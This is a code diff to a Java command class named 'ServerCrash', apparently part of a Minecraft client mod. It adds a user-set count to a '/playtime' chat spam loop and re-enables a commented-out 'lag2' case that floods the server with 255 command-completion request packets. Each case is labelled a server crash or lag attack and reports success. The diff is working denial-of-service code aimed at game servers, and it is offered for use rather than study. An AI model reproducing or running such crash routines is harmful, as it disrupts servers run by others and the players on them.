@@ -130,8 +130,9 @@ public class ServerCrash extends Command {
             }
 
             case "playtime" -> {
-                for (int i = 0; i < 10; i++) {
-                    client.player.sendChatMessage("/playtime " + rndStr(12));
+                int size = new IntegerArgumentParser().parse(args[1]);
+                for (int i = 0; i < size; i++) {
+                    client.player.sendChatMessage("/playtime " + rndStr(1));
                 }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Playtime Crash");
             }
@@ -150,12 +151,12 @@ public class ServerCrash extends Command {
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
             }
 
-            //case "lag2" -> {
-            //    for(int i = 0; i < 255; i++){
-            //        client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
-            //    }
-            //    Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
-            //}
+            case "lag2" -> {
+                for(int i = 0; i < 255; i++){
+                    client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, "/"));
+                }
+                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Quick Lag Crash");
+            }
 
             case "maptool" -> {
                 int size = new IntegerArgumentParser().parse(args[1]);
